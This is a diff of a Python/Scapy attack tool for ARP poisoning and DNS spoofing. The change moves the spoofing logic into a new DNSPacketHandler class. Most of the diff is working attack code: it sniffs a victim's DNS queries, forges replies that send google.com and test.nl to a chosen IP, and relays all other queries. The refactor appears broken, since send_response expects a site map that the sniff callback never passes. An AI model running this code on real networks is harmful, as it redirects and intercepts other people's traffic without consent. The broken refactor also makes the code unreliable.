@@ -43,6 +43,9 @@ if sys.version_info[0] >= 3:
 elif sys.version_info[0] < 3:
     input = raw_input
 
+
+print("""ARPPV1.0.3.py has been changed for testing, 
+      if you want to use the stable code with DNS spoofing use ARPPV1.0.2.py""")
 class ARPP(object):
     def __init__(self):
         """The __init__ defines some attributes of the class helping with: 
@@ -458,77 +461,27 @@ class ARPP(object):
             ipVictim (str, optional): The IP of the victim that you want to DNS spoof. Defaults to "".
         """
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
-        target_sites_map = {b"google.com.":"10.0.2.9",\
+        target_sites_map = {
+            b"google.com.":"10.0.2.9",\
             b"www.google.com.":"10.0.2.9",\
             b"www.google.com":"10.0.2.9",\
             b"test.nl.":"10.0.2.9",\
-            b"www.test.nl.":"10.0.2.9"}
-        target_sites=list(target_sites_map.keys())
-        fake_ips = list(target_sites_map.values())
-        
+            b"www.test.nl.":"10.0.2.9"
+            }
         loc_dns = "127.0.0.1" # corresponding to iptable ip address that packet is routed to
         
+        DPH = DNSPacketHandler(loc_dns, self.SELECTED_INTERFACE)
+        
         # this function is called on each packet in the sniff call further ahead
-        def packet_callback(loc_dns_server):
-            def forward_dns(pkt):
-                print("Forwarding: {}".format(pkt[DNSQR].qname))
-                response = sr1(
-                    IP(dst='8.8.8.8')/
-                        UDP(sport=pkt[UDP].sport)/
-                        DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
-                    verbose=0,
-                )
-                resp_pkt = IP(dst=pkt[IP].src, src=loc_dns_server)/UDP(dport=pkt[UDP].sport)/DNS()
-                resp_pkt[DNS] = response[DNS]
-                send(resp_pkt, verbose=0)
-                return "Responding to {}".format(pkt[IP].src)
-            
-            def forward_packet(pkt):
-                sendp(pkt, iface=self.SELECTED_INTERFACE, verbose=0)
-
-            def send_spoofed_response(packet):
-                # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
-                if (DNS in packet\
-                    and packet[DNS].opcode == 0\
-                    and packet[DNS].ancount == 0):
-                    
-                    qname= packet[DNSQR].qname
-                    qname_decoded = qname.decode("utf-8")
-                    
-                    
-                    # if the DNS query is for a website that we are targeting
-                    if qname in target_sites:
-                        print("[+] Caught DNS request from {} for {}".format(packet[IP].src, qname_decoded))
-                        
-                        # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
-                        index_of_target_site = target_sites.index(qname)
-                        fake_ip = fake_ips[index_of_target_site]
-                        
-                        # create a fake DNS reply packet
-                        # maybe it is missing the right flags for it to be meaningful to the victim device
-                        fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
-                            /UDP(dport=packet[UDP].sport, sport=53)\
-                            /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=fake_ip))\
-                            /DNSRR(rrname=qname, rdata=fake_ip)
-                        
-                        # send the fake packet on the selected interface
-                        send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
-                        print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, qname_decoded))
-                    
-                    # if the DNS query is not for a website we're targeting
-                    else:
-                        forward_dns(packet)
-                else:
-                    forward_packet(packet)
-            
-            return send_spoofed_response
+        def packet_callback():
+            return DPH.send_response
                         
         # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
         # the threading.Event() is used to stop the thread when the user wants (by using e.set())
         e=threading.Event()
         def rec(event):
             while True:
-                sniff(timeout=5, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback(loc_dns), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
+                sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback(), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
                 if event.is_set():
                     break
         
@@ -596,6 +549,84 @@ class ARPP(object):
             self.parse_command(command=command)
         except SyntaxError:
             pass
+
+
+class DNSPacketHandler(object):
+    def __init__(self, loc_dns_server, selected_interface) -> None:
+        self.LOC_DNS_SERVER = loc_dns_server
+        self.SELECTED_INTERFACE = selected_interface
+        
+    
+    def forward_dns(self, dns_packet):
+        print("Forwarding: {}".format(dns_packet[DNSQR].qname))
+        response = sr1(IP(dst='8.8.8.8')/
+                    UDP(sport=dns_packet[UDP].sport)/
+                    DNS(rd=1, id=dns_packet[DNS].id, qd=DNSQR(qname=dns_packet[DNSQR].qname)),
+                    verbose=0)
+        resp_dns_packet = IP(dst=dns_packet[IP].src, src=self.LOC_DNS_SERVER)/UDP(dport=dns_packet[UDP].sport)/DNS()
+        resp_dns_packet[DNS] = response[DNS]
+        send(resp_dns_packet, verbose=0)
+        return "Responding to {}".format(dns_packet[IP].src)
+    
+    def forward_modified_dns(self, dns_packet, new_qname_decoded):
+        new_qname=new_qname_decoded.encode()
+        print("Modifying {} to {}".format(dns_packet[DNSQR].qname, new_qname))
+        # note that in the DNS layer of the result below the query name has been changed to a new one
+        response = sr1(IP(dst='8.8.8.8')/
+                    UDP(sport=dns_packet[UDP].sport)/
+                    DNS(rd=1, id=dns_packet[DNS].id, qd=DNSQR(qname=new_qname)),
+                    verbose=0)
+        resp_dns_packet = IP(dst=dns_packet[IP].src, src=self.LOC_DNS_SERVER)/UDP(dport=dns_packet[UDP].sport)/DNS()
+        resp_dns_packet[DNS] = response[DNS]
+        send(resp_dns_packet, verbose=0)
+        return "Responding to {}".format(dns_packet[IP].src)
+            
+    def forward_packet(self, packet):
+        """Forwarding of arbitrary packets
+
+        Args:
+            packet (_type_): _description_
+        """
+        sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)
+
+    def send_response(self, packet, target_sites_map):
+        target_sites= list(target_sites_map.keys())
+        fake_ips    = list(target_sites_map.values())
+        
+        # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
+        if (DNS in packet\
+            and packet[DNS].opcode == 0\
+            and packet[DNS].ancount == 0):
+            
+            qname= packet[DNSQR].qname
+            qname_decoded = qname.decode("utf-8")
+            
+            
+            # if the DNS query is for a website that we are targeting
+            if qname in target_sites:
+                print("[+] Caught DNS request from {} for {}".format(packet[IP].src, qname_decoded))
+                
+                # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
+                index_of_target_site = target_sites.index(qname)
+                fake_ip = fake_ips[index_of_target_site]
+                
+                # create a fake DNS reply packet
+                # maybe it is missing the right flags for it to be meaningful to the victim device
+                fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
+                    /UDP(dport=packet[UDP].sport, sport=53)\
+                    /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=fake_ip))\
+                    /DNSRR(rrname=qname, rdata=fake_ip)
+                
+                # send the fake packet on the selected interface
+                send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
+                print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, qname_decoded))
+            
+            # if the DNS query is not for a website we're targeting
+            else:
+                self.forward_dns(packet)
+        else:
+            self.forward_packet(packet)
+
 
 def main():
     # create the class and start the command line interface
